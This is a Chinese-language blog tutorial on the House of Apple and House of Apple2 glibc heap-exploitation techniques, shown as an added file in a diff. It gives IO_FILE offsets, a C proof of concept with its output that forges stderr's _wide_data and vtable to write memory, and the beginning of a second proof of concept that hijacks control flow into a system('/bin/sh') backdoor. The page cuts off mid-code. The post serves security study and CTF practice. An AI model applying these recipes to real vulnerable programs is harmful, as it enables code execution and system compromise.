@@ -1,0 +1,559 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="House Of AppleHouse Of Apple 可以在仅使用一次 largebin attack 并限制读写次数的条件下进行 FSOP 利用 此方法利用成功的前提是已经泄露出 libc_base 地址和 heap_base 地址   House Of Apple 原理当程序从 main 函数返回或者执行 exit 函数的时候，均会调用 fcloseall 函数，该调用链为：  1exit">
+<meta property="og:type" content="article">
+<meta property="og:title" content="House Of Apple-原理">
+<meta property="og:url" content="http://example.com/2022/11/08/House%20Of%20Apple-%E5%8E%9F%E7%90%86/index.html">
+<meta property="og:site_name" content="Pwn进你的心">
+<meta property="og:description" content="House Of AppleHouse Of Apple 可以在仅使用一次 largebin attack 并限制读写次数的条件下进行 FSOP 利用 此方法利用成功的前提是已经泄露出 libc_base 地址和 heap_base 地址   House Of Apple 原理当程序从 main 函数返回或者执行 exit 函数的时候，均会调用 fcloseall 函数，该调用链为：  1exit">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-11-08T15:41:08.000Z">
+<meta property="article:modified_time" content="2022-11-08T15:42:23.300Z">
+<meta property="article:author" content="yhellow">
+<meta property="article:tag" content="House Of Apple">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2022/11/08/House%20Of%20Apple-%E5%8E%9F%E7%90%86/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>House Of Apple-原理 | Pwn进你的心</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Pwn进你的心</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/08/House%20Of%20Apple-%E5%8E%9F%E7%90%86/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="yhellow">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pwn进你的心">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          House Of Apple-原理
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2022-11-08 23:41:08 / Modified: 23:42:23" itemprop="dateCreated datePublished" datetime="2022-11-08T23:41:08+08:00">2022-11-08</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/HouseOfSeries/" itemprop="url" rel="index"><span itemprop="name">HouseOfSeries</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>10k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>9 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="House-Of-Apple"><a href="#House-Of-Apple" class="headerlink" title="House Of Apple"></a>House Of Apple</h2><p>House Of Apple 可以在仅使用一次 largebin attack 并限制读写次数的条件下进行 FSOP 利用</p>
+<p>此方法利用成功的前提是已经泄露出 <code>libc_base</code> 地址和 <code>heap_base</code> 地址 </p>
+<hr>
+<h2 id="House-Of-Apple-原理"><a href="#House-Of-Apple-原理" class="headerlink" title="House Of Apple 原理"></a>House Of Apple 原理</h2><p>当程序从 <code>main</code> 函数返回或者执行 <code>exit</code> 函数的时候，均会调用 <code>fcloseall</code> 函数，该调用链为： </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exit</span> -&gt; fcloseall -&gt; _IO_cleanup -&gt; _IO_flush_all_lockp -&gt; _IO_wstrn_overflow</span><br></pre></td></tr></table></figure>
+<ul>
+<li>最后会遍历 <code>_IO_list_all</code> 存放的每一个 <code>IO_FILE</code> 结构体</li>
+<li>如果满足条件的话，会调用每个结构体中 <code>vtable-&gt;_overflow</code> 函数指针指向的函数</li>
+</ul>
+<p>使用 largebin attack 可以劫持 <code>_IO_list_all</code> 变量，将其替换为伪造的 <code>IO_FILE</code> 结构体，而在此时，我们其实仍可以继续利用某些IO流函数去修改其他地方的值</p>
+<p>要想修改其他地方的值，就离不开 <code>_IO_FILE</code> 的一个成员 <code>_wide_data</code> 的利用：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">amd64：</span><br><span class="line"></span><br><span class="line"><span class="number">0x0</span>:<span class="string">&#x27;_flags&#x27;</span>,</span><br><span class="line"><span class="number">0x8</span>:<span class="string">&#x27;_IO_read_ptr&#x27;</span>,</span><br><span class="line"><span class="number">0x10</span>:<span class="string">&#x27;_IO_read_end&#x27;</span>,</span><br><span class="line"><span class="number">0x18</span>:<span class="string">&#x27;_IO_read_base&#x27;</span>,</span><br><span class="line"><span class="number">0x20</span>:<span class="string">&#x27;_IO_write_base&#x27;</span>,</span><br><span class="line"><span class="number">0x28</span>:<span class="string">&#x27;_IO_write_ptr&#x27;</span>,</span><br><span class="line"><span class="number">0x30</span>:<span class="string">&#x27;_IO_write_end&#x27;</span>,</span><br><span class="line"><span class="number">0x38</span>:<span class="string">&#x27;_IO_buf_base&#x27;</span>,</span><br><span class="line"><span class="number">0x40</span>:<span class="string">&#x27;_IO_buf_end&#x27;</span>,</span><br><span class="line"><span class="number">0x48</span>:<span class="string">&#x27;_IO_save_base&#x27;</span>,</span><br><span class="line"><span class="number">0x50</span>:<span class="string">&#x27;_IO_backup_base&#x27;</span>,</span><br><span class="line"><span class="number">0x58</span>:<span class="string">&#x27;_IO_save_end&#x27;</span>,</span><br><span class="line"><span class="number">0x60</span>:<span class="string">&#x27;_markers&#x27;</span>,</span><br><span class="line"><span class="number">0x68</span>:<span class="string">&#x27;_chain&#x27;</span>,</span><br><span class="line"><span class="number">0x70</span>:<span class="string">&#x27;_fileno&#x27;</span>,</span><br><span class="line"><span class="number">0x74</span>:<span class="string">&#x27;_flags2&#x27;</span>,</span><br><span class="line"><span class="number">0x78</span>:<span class="string">&#x27;_old_offset&#x27;</span>,</span><br><span class="line"><span class="number">0x80</span>:<span class="string">&#x27;_cur_column&#x27;</span>,</span><br><span class="line"><span class="number">0x82</span>:<span class="string">&#x27;_vtable_offset&#x27;</span>,</span><br><span class="line"><span class="number">0x83</span>:<span class="string">&#x27;_shortbuf&#x27;</span>,</span><br><span class="line"><span class="number">0x88</span>:<span class="string">&#x27;_lock&#x27;</span>,</span><br><span class="line"><span class="number">0x90</span>:<span class="string">&#x27;_offset&#x27;</span>,</span><br><span class="line"><span class="number">0x98</span>:<span class="string">&#x27;_codecvt&#x27;</span>,</span><br><span class="line"><span class="number">0xa0</span>:<span class="string">&#x27;_wide_data&#x27;</span>,</span><br><span class="line"><span class="number">0xa8</span>:<span class="string">&#x27;_freeres_list&#x27;</span>,</span><br><span class="line"><span class="number">0xb0</span>:<span class="string">&#x27;_freeres_buf&#x27;</span>,</span><br><span class="line"><span class="number">0xb8</span>:<span class="string">&#x27;__pad5&#x27;</span>,</span><br><span class="line"><span class="number">0xc0</span>:<span class="string">&#x27;_mode&#x27;</span>,</span><br><span class="line"><span class="number">0xc4</span>:<span class="string">&#x27;_unused2&#x27;</span>,</span><br><span class="line"><span class="number">0xd8</span>:<span class="string">&#x27;vtable&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>我们在伪造 <code>_IO_FILE</code> 结构体的时候，伪造 <code>_wide_data</code> 变量，然后通过某些函数，比如 <code>_IO_wstrn_overflow</code> 就可以将已知地址空间上的某些值修改为一个已知值</p>
+<h2 id="House-Of-Apple-利用姿势"><a href="#House-Of-Apple-利用姿势" class="headerlink" title="House Of Apple 利用姿势"></a>House Of Apple 利用姿势</h2><p>使用 house of apple 的条件为：</p>
+<ul>
+<li>程序从 <code>main</code> 函数返回或能调用 <code>exit</code> 函数</li>
+<li>能泄露出 <code>libc_base</code> 地址和 <code>heap_base</code> 地址 </li>
+<li>能使用一次 largebin attack（一次即可） </li>
+</ul>
+<p>先利用 largebin attack 劫持 <code>_IO_list_all</code>，然后伪造一个 <code>stderr IO_FILE</code>：</p>
+<ul>
+<li>stderr+0x28 = -1（stderr-&gt;_IO_write_ptr）</li>
+<li>stderr+0x74 = 8（stderr-&gt;_flags2）</li>
+<li>stderr+0xa0 = target（stderr-&gt;_wide_data）</li>
+<li>stderr+0xd8 == _IO_wstrn_jumps（stderr-&gt;vtable）</li>
+</ul>
+<p>最后调用 exit 完成修改（因为 <code>stderr IO_FILE</code> 被伪造，因此程序不会真的退出）</p>
+<p>使用案例如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] allocate a 0x100 chunk&quot;</span>);</span><br><span class="line">    <span class="keyword">size_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0xf0</span>);</span><br><span class="line">    <span class="keyword">size_t</span> *tmp = p1;</span><br><span class="line">    <span class="keyword">size_t</span> old_value = <span class="number">0x1122334455667788</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span> / <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        p1[i] = old_value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;===========================old value=======================&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%p]: 0x%016lx  0x%016lx\n&quot;</span>, tmp, tmp[<span class="number">0</span>], tmp[<span class="number">1</span>]);</span><br><span class="line">        tmp += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;===========================old value=======================&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> puts_addr = (<span class="keyword">size_t</span>)&amp;<span class="built_in">puts</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] puts address: %p\n&quot;</span>, (<span class="keyword">void</span> *)puts_addr);</span><br><span class="line">    <span class="keyword">size_t</span> <span class="built_in">stderr</span> = puts_addr + <span class="number">0x1691a0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> stderr_write_ptr_addr = <span class="built_in">stderr</span> + <span class="number">0x28</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] stderr-&gt;_IO_write_ptr address: %p\n&quot;</span>, (<span class="keyword">void</span> *)stderr_write_ptr_addr);</span><br><span class="line">    <span class="keyword">size_t</span> stderr_flags2_addr = <span class="built_in">stderr</span> + <span class="number">0x74</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] stderr-&gt;_flags2 address: %p\n&quot;</span>, (<span class="keyword">void</span> *)stderr_flags2_addr);</span><br><span class="line">    <span class="keyword">size_t</span> stderr_wide_data_addr = <span class="built_in">stderr</span> + <span class="number">0xa0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] stderr-&gt;_wide_data address: %p\n&quot;</span>, (<span class="keyword">void</span> *)stderr_wide_data_addr);</span><br><span class="line">    <span class="keyword">size_t</span> sdterr_vtable_addr = <span class="built_in">stderr</span> + <span class="number">0xd8</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] stderr-&gt;vtable address: %p\n&quot;</span>, (<span class="keyword">void</span> *)sdterr_vtable_addr);</span><br><span class="line">    <span class="keyword">size_t</span> _IO_wstrn_jumps_addr = <span class="built_in">stderr</span> - <span class="number">0x4960</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] _IO_wstrn_jumps address: %p\n&quot;</span>, (<span class="keyword">void</span> *)_IO_wstrn_jumps_addr);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 1: change stderr-&gt;_IO_write_ptr to -1&quot;</span>);</span><br><span class="line">    *(<span class="keyword">size_t</span> *)stderr_write_ptr_addr = (<span class="keyword">size_t</span>)<span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 2: change stderr-&gt;_flags2 to 8&quot;</span>);</span><br><span class="line">    *(<span class="keyword">size_t</span> *)stderr_flags2_addr = <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 3: replace stderr-&gt;_wide_data with the allocated chunk&quot;</span>);</span><br><span class="line">    *(<span class="keyword">size_t</span> *)stderr_wide_data_addr = (<span class="keyword">size_t</span>)p1;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 4: replace stderr-&gt;vtable with _IO_wstrn_jumps&quot;</span>);</span><br><span class="line">    *(<span class="keyword">size_t</span> *)sdterr_vtable_addr = (<span class="keyword">size_t</span>)_IO_wstrn_jumps_addr;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 5: call fcloseall and trigger house of apple&quot;</span>);</span><br><span class="line">    fcloseall();</span><br><span class="line">    tmp = p1;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;===========================new value=======================&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%p]: 0x%016lx  0x%016lx\n&quot;</span>, tmp, tmp[<span class="number">0</span>], tmp[<span class="number">1</span>]);</span><br><span class="line">        tmp += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;===========================new value=======================&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>结果：</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="built_in">exp</span> ./test</span><br><span class="line">[*] allocate a <span class="number">0x100</span> chunk</span><br><span class="line">===========================old value=======================</span><br><span class="line">[<span class="number">0x55a85a8bc2a0</span>]: <span class="number">0x1122334455667788</span>  <span class="number">0x1122334455667788</span></span><br><span class="line">[<span class="number">0x55a85a8bc2b0</span>]: <span class="number">0x1122334455667788</span>  <span class="number">0x1122334455667788</span></span><br><span class="line">[<span class="number">0x55a85a8bc2c0</span>]: <span class="number">0x1122334455667788</span>  <span class="number">0x1122334455667788</span></span><br><span class="line">[<span class="number">0x55a85a8bc2d0</span>]: <span class="number">0x1122334455667788</span>  <span class="number">0x1122334455667788</span></span><br><span class="line">===========================old value=======================</span><br><span class="line">[*] <span class="built_in">puts</span> address: <span class="number">0x7f6c95c1c420</span></span><br><span class="line">[*] <span class="built_in">stderr</span>-&gt;_IO_write_ptr address: <span class="number">0x7f6c95d855e8</span></span><br><span class="line">[*] <span class="built_in">stderr</span>-&gt;_flags2 address: <span class="number">0x7f6c95d85634</span></span><br><span class="line">[*] <span class="built_in">stderr</span>-&gt;_wide_data address: <span class="number">0x7f6c95d85660</span></span><br><span class="line">[*] <span class="built_in">stderr</span>-&gt;vtable address: <span class="number">0x7f6c95d85698</span></span><br><span class="line">[*] _IO_wstrn_jumps address: <span class="number">0x7f6c95d80c60</span></span><br><span class="line">[+] step <span class="number">1</span>: change <span class="built_in">stderr</span>-&gt;_IO_write_ptr to <span class="number">-1</span></span><br><span class="line">[+] step <span class="number">2</span>: change <span class="built_in">stderr</span>-&gt;_flags2 to <span class="number">8</span></span><br><span class="line">[+] step <span class="number">3</span>: replace <span class="built_in">stderr</span>-&gt;_wide_data with the allocated chunk</span><br><span class="line">[+] step <span class="number">4</span>: replace <span class="built_in">stderr</span>-&gt;vtable with _IO_wstrn_jumps</span><br><span class="line">[+] step <span class="number">5</span>: call fcloseall <span class="keyword">and</span> trigger house of apple</span><br><span class="line">===========================<span class="keyword">new</span> value=======================</span><br><span class="line">[<span class="number">0x55a85a8bc2a0</span>]: <span class="number">0x00007f6c95d856b0</span>  <span class="number">0x00007f6c95d857b0</span></span><br><span class="line">[<span class="number">0x55a85a8bc2b0</span>]: <span class="number">0x00007f6c95d856b0</span>  <span class="number">0x00007f6c95d856b0</span></span><br><span class="line">[<span class="number">0x55a85a8bc2c0</span>]: <span class="number">0x00007f6c95d856b0</span>  <span class="number">0x00007f6c95d856b0</span></span><br><span class="line">[<span class="number">0x55a85a8bc2d0</span>]: <span class="number">0x00007f6c95d856b0</span>  <span class="number">0x00007f6c95d857b0</span></span><br><span class="line">===========================<span class="keyword">new</span> value=======================</span><br></pre></td></tr></table></figure>
+<ul>
+<li>成功对堆上的数据进行了修改</li>
+</ul>
+<p>上面这种用法只能实现已知地址任意写（和 largebin attack 的效果类似），下面这种利用方式可以直接劫持程序流程（称为 house of apple2）</p>
+<h2 id="House-Of-Apple2-原理"><a href="#House-Of-Apple2-原理" class="headerlink" title="House Of Apple2 原理"></a>House Of Apple2 原理</h2><p><code>stdin/stdout/stderr</code> 这三个 <code>_IO_FILE</code> 结构体会以 <code>_IO_file_jumps</code> 为虚表，而其中的函数 <code>IO_validate_vtable</code> 负责检查 <code>vtable</code> 的合法性</p>
+<p>但在调用虚表 <code>_wide_vtable</code> 里面的函数时，并没有检查 <code>vtable</code> 的合法性</p>
+<p>因此，我们可以劫持 <code>IO_FILE</code> 的 <code>vtable</code> 为 <code>_IO_wfile_jumps</code>，控制 <code>_wide_data</code> 为可控的堆地址空间，进而控制 <code>_wide_data-&gt;_wide_vtable</code> 为可控的堆地址空间，然后控制程序的执行流：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_IO_wdefault_xsgetn -&gt; _IO_switch_to_wget_mode -&gt; backdoor</span><br></pre></td></tr></table></figure>
+<h2 id="House-Of-Apple2-利用姿势"><a href="#House-Of-Apple2-利用姿势" class="headerlink" title="House Of Apple2 利用姿势"></a>House Of Apple2 利用姿势</h2><p>使用 house of apple2 的条件为：</p>
+<ul>
+<li>能泄露出 <code>libc_base</code> 地址和 <code>heap_base</code> 地址 </li>
+<li>能控制程序执行<code>IO</code>操作：<ul>
+<li>从 <code>main</code> 函数返回</li>
+<li>调用 <code>exit</code> 函数</li>
+<li>通过 <code>__malloc_assert</code> 触发</li>
+</ul>
+</li>
+<li>能控制 <code>_IO_FILE</code> 的 <code>vtable</code> 和 <code>_wide_data</code>（一般使用 <code>largebin attack</code>去控制）</li>
+</ul>
+<p>使用案例如下：（使用 <code>_IO_wdefault_xsgetn</code> 调用链）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">backdoor</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span 